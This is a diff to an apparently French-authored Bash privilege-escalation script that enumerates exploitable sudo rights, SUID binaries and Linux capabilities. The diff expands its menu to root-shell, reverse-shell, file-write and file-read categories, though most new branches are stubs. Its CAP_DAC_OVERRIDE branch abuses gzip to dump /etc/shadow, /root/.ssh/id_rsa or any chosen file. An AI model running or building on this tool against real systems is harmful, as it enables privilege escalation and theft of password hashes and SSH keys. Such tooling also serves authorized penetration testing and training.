@@ -39,15 +39,12 @@ echo " "
 echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
 echo " "
 
-echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
-echo " "
-
-echo "Shell (CAP_SETUID Capability) : "
-sudo getcap -r / 2>/dev/null | grep setuid | grep -Ff ./Dependencies/ShellCap.txt | awk -F' = ' '{print $1}' | awk '{print $1}'
+echo "Root Shell (CAP_SETUID Capability) : "
+getcap -r / 2>/dev/null | grep setuid | grep -Ff ./Dependencies/ShellCap.txt | awk -F' = ' '{print $1}' | awk '{print $1}'
 echo " "
 
 echo "Shell (Sudo) : "
-sudo -l | grep "root" | awk '{print $NF}' | grep -Ff ./Dependencies/ShellSudo.txt
+sudo -l | grep "(root)" | awk '{print $NF}' | grep -Ff ./Dependencies/ShellSudo.txt
 echo " "
 
 echo "Shell (SUID) : "
@@ -80,7 +77,7 @@ echo "████████████████████████�
 echo " "
 
 echo "File Read (CAP_DAC_OVERRIDE Capability) : "
-sudo getcap -r / 2>/dev/null | grep dac_override | grep -Ff ./Dependencies/FileReadCap.txt | awk -F' = ' '{print $1}' | awk '{print $1}'
+getcap -r / 2>/dev/null | grep dac_override | grep -Ff ./Dependencies/FileReadCap.txt | awk -F' = ' '{print $1}' | awk '{print $1}'
 echo " "
 
 echo "File Read (Sudo) : "
@@ -94,21 +91,27 @@ echo " "
 while true; do
     echo "Categories : "
     echo " "
-    echo "1) Sudo Right"
-    echo "2) SUID"
-    echo "3) Capabilities (CAP_SETUID)"
-    echo "4) Capabilities (CAP_DAC_OVERRIDE)"
-    echo "5) Quit"
+    echo "1) Root Shell (CAP_SETUID Capability)"
+    echo "2) Root Shell (Sudo)"
+    echo "3) Root Shell (SUID)"
+    echo "4) Reverse Shell (Sudo)"
+    echo "5) Reverse Shell (SUID)"
+    echo "6) File Write (Sudo)"
+    echo "7) File Write (SUID)"
+    echo "8) File Read (CAP_DAC_OVERRIDE Capability)"
+    echo "9) File Read (Sudo)"
+    echo "10) File Read (SUID)"
+    echo "11) Quit"
     echo " "    
     read -p "Vulnerability Choice : " choix
 
     case "$choix" in
         1)
-            echo "Sudo Rights : "
+            echo "Root Shell (CAP_SETUID Capability) : "
             break
             ;;
         2)
-            echo "SUID : "
+            echo "Root Shell (Sudo) : "
             break
             ;;
         3)
@@ -155,11 +158,26 @@ while true; do
                         ;;
                 esac
             done                
-                
             break
             ;;
         4)
-            echo "Capabilities (CAP_DAC_OVERRIDE) : "
+            echo "Reverse Shell (Sudo)"
+            break
+            ;;
+        5)
+            echo "Reverse Shell (SUID) : "
+            break
+            ;;
+        6)
+            echo "File Write (Sudo) : "
+            break
+            ;;
+        7)
+            echo "File Write (SUID) : "
+            break
+            ;;
+        8)
+            echo "File Read (CAP_DAC_OVERRIDE Capability) : "
             result=$(getcap -r / 2>/dev/null | grep dac_override | awk -F' = ' '{print $1}' | awk '{print $1}')
 
             if [ -z "$result" ]; then
@@ -173,23 +191,40 @@ while true; do
             select choice in $result; do
                 case "$choice" in
                     *gzip*)
-                        echo "Trying to Harvest Critical Data with gzip"
-                        "$choice" -c /etc/shadow | gzip -d
-                        "$choice" -c /root/.ssh/id_rsa | gzip -d
-                        exit 0
+                        while true; do
+                            select file in "/root/.ssh/id_rsa" "/etc/shadow" "Autre"; do
+                                [[ "$file" == "Autre" ]] && read -p "Fichier : " file
+
+                                gzip -c "$file" | gzip -d
+                                break
+                            done
+
+                            select again in "Oui" "Non"; do
+                                case "$again" in
+                                    Oui) break ;;
+                                    Non) break 2 ;;
+                                esac
+                            done
+                        done
                         ;;
                     *)
                         echo "Choix invalide"
-                        printf '%s\n' "$result" | nl -w2 -s') '
                         ;;
                 esac
-            done 
-            
+            done
             break
             ;;
-        5)
-            exit 0
+        9)
+            echo "File Read (Sudo) : "
             break
+            ;;
+        10)
+            echo "File Read (SUID) : "
+            break
+            ;;
+        11)
+            echo "Quit"
+            exit 0
             ;;
         *)
             echo "Invalid Choice, Restart"
